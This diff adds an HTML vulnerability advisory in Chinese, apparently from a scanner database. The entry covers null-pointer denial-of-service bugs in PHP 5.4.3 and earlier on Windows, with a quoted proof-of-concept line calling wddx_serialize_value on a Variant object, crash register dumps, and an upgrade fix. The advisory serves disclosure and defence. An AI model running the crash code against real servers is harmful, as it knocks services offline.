@@ -1,0 +1,300 @@
+
+<!DOCTYPE html>
+
+<html>
+
+	<head>
+
+		<meta charset="utf-8">
+
+        <link rel="stylesheet" href="/vulbox/source/table.css" />
+
+	</head>
+
+	<body class="dialog">
+
+		<div class="content">
+
+			<div class="wrap">
+
+				<div class="cont">
+
+					<table class="table table-hover table-mc-light-blue" style="margin-top: 0;">
+
+						<thead>
+
+							<tr class="first_title">
+
+								<th colspan="2">漏洞描述</th>
+
+							</tr>
+
+						</thead>
+
+						<tbody>
+
+							<tr>
+
+								<th width="70">漏洞名称</th>
+
+								<td>
+
+								    <img style="float:left;" src="/vulbox/source/m.gif" align="absmiddle"/>
+
+								<span style="float:left;margin-top:1px;margin-top:2px\9;">PHP多个空指针引用拒绝服务漏洞</span>
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th valign="top">详细描述</th>
+
+								<td valign="top">
+
+									PHP是一种HTML内嵌式的语言，PHP与微软的ASP颇有几分相似，都是一种在服务器端执行的嵌入HTML文档的脚本语言，语言的风格有类似于C语言，现在被很多的网站编程人员广泛的运用。<br />
+
+									<br />
+
+									PHP 5.4.3之前版本在实现时存在空指针引用导致的多个拒绝服务漏洞，攻击者可利用这些漏洞造成应用崩溃。<br />
+
+									<br />
+
+									&lt;*来源：condis<br />
+
+									  *&gt;<br />
+
+									测试方法：<br />
+
+									警 告<br />
+
+									<br />
+
+									以下程序(方法)可能带有攻击性，仅供安全研究与教学之用。使用者风险自负！<br />
+
+									<br />
+
+									&lt;?php<br />
+
+									<br />
+
+									/*<br />
+
+									<br />
+
+									PHP &lt;= 5.4.3 wddx_serialize_* / stream_bucket_* Variant Object Null Ptr Derefernce<br />
+
+									Author : condis<br />
+
+									Date : 10.04.2012 AD<br />
+
+									Website : http://cond.psychodela.pl<br />
+
+									<br />
+
+									----<br />
+
+									<br />
+
+									Download : http://php.net/downloads.php<br />
+
+									<br />
+
+									Tested on:<br />
+
+									     <br />
+
+									    PHP 5.3.8  + Windows XP SP3 Professional PL<br />
+
+									    PHP 5.3.10 + Windows XP SP3 Professional PL<br />
+
+									    PHP 5.4.0  + Windows XP SP3 Professional PL<br />
+
+									    PHP 5.4.3  + Windows XP SP3 Professional PL<br />
+
+									     <br />
+
+									Description:<br />
+
+									<br />
+
+									wddx_serialize_value and wddx_serialize_vars functions fails to handle Variant<br />
+
+									object when it is given as a first argument.<br />
+
+									<br />
+
+									Registers:<br />
+
+									<br />
+
+									    EAX 00000000<br />
+
+									    ECX 1056AAE8 php5ts.1056AAE8<br />
+
+									    EDX 100EFCE0 php5ts.100EFCE0<br />
+
+									    EBX 01032AB0<br />
+
+									    ESP 00C0FAE0<br />
+
+									    EBP 00000000<br />
+
+									    ESI 0121E478<br />
+
+									    EDI 0121CB50<br />
+
+									    EIP 1028F22E php5ts.1028F22E<br />
+
+									<br />
+
+									Crash:<br />
+
+									<br />
+
+									    1028F22E   8A45 25          MOV AL,BYTE PTR SS:[EBP+25]<br />
+
+									<br />
+
+									Situation looks pretty much the same for both wddx_serialize_vars and<br />
+
+									wddx_serialize_value. Also functions stream_bucket_prepend and stream_bucket_append<br />
+
+									have some problems with handling Variant object when given as a second argument:<br />
+
+									<br />
+
+									stream_bucket_append(1, new Variant(1));<br />
+
+									stream_bucket_prepend(1, new Variant(1));<br />
+
+									<br />
+
+									PS : Variant object is only available in PHP for Windows OS and it was implemented<br />
+
+									in PHP &gt; 4.1.0 and PHP 5.<br />
+
+									<br />
+
+									For more details check : http://php.net/manual/en/class.variant.php<br />
+
+									<br />
+
+									PS2: After running this via webserver my Apache wasn&#39;t able to handle requests<br />
+
+									anymore and I had to restart him :)<br />
+
+									<br />
+
+									kthxbye<br />
+
+									<br />
+
+									*/<br />
+
+									<br />
+
+									wddx_serialize_value(new Variant(666));<br />
+
+									<br />
+
+									?&gt;<br />
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th  valign="top">解决方案</th>
+
+								<td valign="top">
+
+									厂商补丁：<br />
+
+									<br />
+
+									PHP<br />
+
+									---<br />
+
+									目前厂商已经发布升级版本修复此安全问题，建议升级PHP至5.4.4版本或之后版本，请到厂商的官方页面下载升级版本：<br />
+
+									<br />
+
+									http://www.php.net<br />
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>威胁分值</th>
+
+								<td>4</td>
+
+							</tr>
+
+							<tr>
+
+								<th>危险插件</th>
+
+								<td>否</td>
+
+							</tr>
+
+							<tr>
+
+                                <th>发现日期</th>
+
+                                <td>2012-05-11</td>
+
+                            </tr>
+
+							<tr>
+
+                                <th>发布日期</th>
+
+                                <td>2012-05-30</td>
+
+                            </tr>
+
+							<tr>
+
+								<th>BUGTRAQ</th>
+
+								<td>
+
+									<a href="http://www.securityfocus.com/bid/53643" target="_blank">53643</a>
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>NSFOCUS</th>
+
+								<td>
+
+									<a href="http://www.nsfocus.net/index.php?act=sec_bug&do=view&bug_id=19674" target="_blank">19674</a>
+
+								</td>
+
+							</tr>
+
+						</tbody>
+
+					</table>
+
+				</div>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>
